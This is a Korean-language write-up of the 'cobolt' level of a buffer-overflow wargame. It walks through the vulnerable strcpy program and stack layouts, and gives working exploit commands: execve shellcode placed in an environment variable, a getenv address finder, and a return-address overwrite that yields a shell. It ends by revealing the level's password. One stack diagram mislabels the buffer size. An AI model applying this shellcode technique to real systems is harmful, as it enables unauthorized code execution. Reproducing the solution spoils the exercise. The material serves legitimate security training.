============================================================================================================
[redhat-lob] (2) cobolt
============================================================================================================


.. graphviz::

    digraph foo {
        a -> b -> c -> d -> e;

        a [shape=box, label="dummy * 20 + envp address"];
        b [shape=box, color=lightblue, label="strcpy"];
        c [shape=box, label="Buffer Overflow"];
        d [shape=box, label="envp address"];
        e [shape=box, label="dummy * 100 + shellcode"];
    }


|

Source Code
============================================================================================================

.. code-block:: c

    int main(int argc, char *argv[])
    {
        char buffer[16];
        if(argc < 2){
            printf("argv error\n");
            exit(0);
        }
        strcpy(buffer, argv[1]);
        printf("%s\n", buffer);
    }

|

Vulnerabliity Vector
============================================================================================================

스택 메모리 공간에 다음과 같이 들어가게 된다.

.. code-block:: console

    ===============
    LOW     
    ---------------
    Buffer  (256byte)
    SFP     (4byte) 
    RET     (4byte)   
    argc    (4byte)   
    argv    (4byte)   
    envp    (4byte)   <
    ---------------
    HIGH    
    ===============

|

Buffer Overflow
============================================================================================================


.. code-block:: console

    ※ 시작시 bash2 명령을 입력하고 bash2 쉘 상태에서 진행
    $ bash2
    $ ./cobolt `python -c "print 'a'*16"`

    aaaaaaaaaaaaaaaa

    $ ./cobolt `python -c "print 'a'*20"`

    aaaaaaaaaaaaaaaaaaaa

    Segmentation fault

|

exploit
============================================================================================================

환경 변수 상에 쉘코드 등록
------------------------------------------------------------------------------------------------------------

환경 변수에 쉘코드를 등록해두고, 입력값 마지막 리턴 주소를 환경 변수 주소로 변경하여 해당 쉘코드를 실행하도록 한다.

.. code-block:: console

    $ export shellcode=`python -c 'print "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"'`

|

환경 변수 주소값 확인
------------------------------------------------------------------------------------------------------------

다음과 같이 소스코드를 작성하여 shellcode 환경 변수에 대한 주소 값을 획득.

.. code-block:: c

    #include <stdio.h>
    int main(int argc, char **argv)
    {
            char *addr;
            addr = getenv(argv[1]);
            printf("address %p\n", addr);
            return 0;
    }

.. code-block:: console

    $ gcc -o get get.c

    get.c: In function `main':
    get.c:5: warning: assignment makes pointer from integer without a cast

    $ ./get shellcode

    address 0xbfffff01

|

RET를 환경 변수 주소로 덮어씌워 공격 진행
------------------------------------------------------------------------------------------------------------

.. code-block:: console

    ===============
    LOW     
    ---------------
    Buffer  (16byte)  <- dummy
    SFP     (4byte)   <- dummy
    RET     (4byte)   <- envp address
    envp    (4byte)   <- nopsled shellcode
    ---------------
    HIGH    
    ===============

|

오버플로우시 RET 주소를 환경 변수 주소로 덮어씌워 해당 쉘코드가 실행되도록 한다.

.. code-block:: console

    $ ./cobolt `python -c 'print "\x90"*20+"\x01\xff\xff\xbf"'`

    bash$ whoami
    cobolt
    bash$ my-pass
    euid = 502
    hacking exposed



